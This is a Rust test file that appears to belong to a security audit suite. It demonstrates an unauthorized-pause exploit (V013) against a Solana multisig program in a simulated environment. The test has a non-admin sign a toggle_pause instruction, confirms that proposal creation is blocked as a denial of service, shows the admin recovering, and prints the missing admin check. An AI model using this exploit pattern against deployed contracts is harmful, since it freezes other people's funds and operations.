// Exploit: Unauthorized Pause (Missing Admin Check)
//
// Vulnerability: V013 - The toggle_pause instruction does not verify that the caller
// is the admin/creator before allowing pause state changes.
//
// Attack: Any attacker can pause the multisig, blocking all operations and causing
// a denial of service. Legitimate proposals cannot be created, approved, or executed.
//
// Result: Complete DoS - multisig operations frozen indefinitely by unauthorized party.

mod utils;

use utils::*;

use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};

#[test]
fn test_exploit_unauthorized_pause() {
    println!("\n=== EXPLOIT TEST: Unauthorized Pause (V013) ===\n");
    println!("[Scenario] Non-admin attacker pauses the multisig");

    let mut scenario = setup_multisig_scenario(2, 0); // threshold = 2, timelock = 0

    println!("[Setup] Creating multisig with threshold = 2...");

    // Create multisig with admin (creator) and members
    let owners = vec![
        (scenario.creator.pubkey(), MemberRole::Admin),
        (scenario.member1.pubkey(), MemberRole::Proposer),
        (scenario.member2.pubkey(), MemberRole::Executor),
    ];

    create_multisig_with_owners(
        &mut scenario.svm,
        &scenario.creator,
        &scenario.multisig_pda,
        &scenario.vault_pda,
        scenario.multisig_id,
        2, // threshold
        0, // timelock
        &owners,
    );

    println!("[Setup] Multisig created (creator is admin)");
    println!("[Setup] Admin: {}", scenario.creator.pubkey());
    println!("[Setup] Attacker: {} (NOT admin)", scenario.attacker.pubkey());

    // Fund the vault
    println!("[Setup] Funding vault with 100 SOL...");
    fund_vault(
        &mut scenario.svm,
        &scenario.vault_pda,
        100 * LAMPORTS_PER_SOL,
    );

    println!("[Setup] Multisig is ACTIVE and operational");

    // EXPLOIT: Non-admin attacker tries to pause the multisig
    println!("\n[Attack] Non-admin attacker attempts to pause multisig...");

    let pause_ix_data = build_toggle_pause_data();

    let pause_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.attacker.pubkey(), true), // NOT the admin!
            AccountMeta::new(scenario.multisig_pda, false),
        ],
        data: pause_ix_data,
    };

    let pause_tx = Transaction::new_signed_with_payer(
        &[pause_ix],
        Some(&scenario.attacker.pubkey()),
        &[&scenario.attacker],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(pause_tx);

    match result {
        Ok(metadata) => {
            println!("[VULNERABLE] Non-admin successfully paused multisig!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);
            println!("[EXPLOIT SUCCESS] Multisig is now PAUSED by unauthorized party");
        }
        Err(e) => {
            println!("[Result] Pause attempt failed: {:?}", e);
            println!("[Analysis] Expected to succeed due to missing admin check");

            let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }
            return;
        }
    }

    // Verify DoS impact: Try to create a proposal while paused
    println!("\n[Attack] Verifying DoS impact: Attempting to create proposal while paused...");

    // Get current proposal_count to derive correct PDA
    let proposal_count = get_multisig_proposal_count(&scenario.svm, &scenario.multisig_pda);
    let (transfer_proposal_pda, _) =
        derive_transfer_proposal_pda(&scenario.multisig_pda, proposal_count);

    let create_transfer_ix = build_create_transfer_proposal_ix(
        &scenario.member1.pubkey(),
        &scenario.multisig_pda,
        &transfer_proposal_pda,
        10 * LAMPORTS_PER_SOL,
        &scenario.member2.pubkey(),
    );

    let create_tx = Transaction::new_signed_with_payer(
        &[create_transfer_ix],
        Some(&scenario.member1.pubkey()),
        &[&scenario.member1],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(create_tx);

    match result {
        Ok(_) => {
            println!("[Result] Proposal creation succeeded (pause not blocking operations)");
            println!("[Analysis] V008 vulnerability: Missing pause check in create_transfer_proposal");
        }
        Err(e) => {
            println!("[Result] Proposal creation blocked: {:?}", e);
            println!("[Result] DoS confirmed: Legitimate operations are blocked");
        }
    }

    // Admin tries to unpause (verifying they can regain control)
    println!("\n[Recovery] Admin attempts to unpause multisig...");

    let unpause_ix_data = build_toggle_pause_data();

    let unpause_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.creator.pubkey(), true), // legitimate admin
            AccountMeta::new(scenario.multisig_pda, false),
        ],
        data: unpause_ix_data,
    };

    let unpause_tx = Transaction::new_signed_with_payer(
        &[unpause_ix],
        Some(&scenario.creator.pubkey()),
        &[&scenario.creator],
        scenario.svm.latest_blockhash(),
    );

    let unpause_result = scenario.svm.send_transaction(unpause_tx);

    match unpause_result {
        Ok(_) => {
            println!("[Recovery] Admin successfully unpaused multisig");
            println!("[Analysis] Admin can recover, but attacker caused temporary DoS");
        }
        Err(e) => {
            println!("[Recovery] Admin unpause failed: {:?}", e);
        }
    }

    println!("\n[Analysis] The vulnerable code is missing this check:");
    println!("           require!(");
    println!("               authority.key() == self.multisig_account.creator,");
    println!("               MultisigError::UnauthorizedPause");
    println!("           );");

    println!("\n=== END: Unauthorized Pause Exploit ===\n");
}
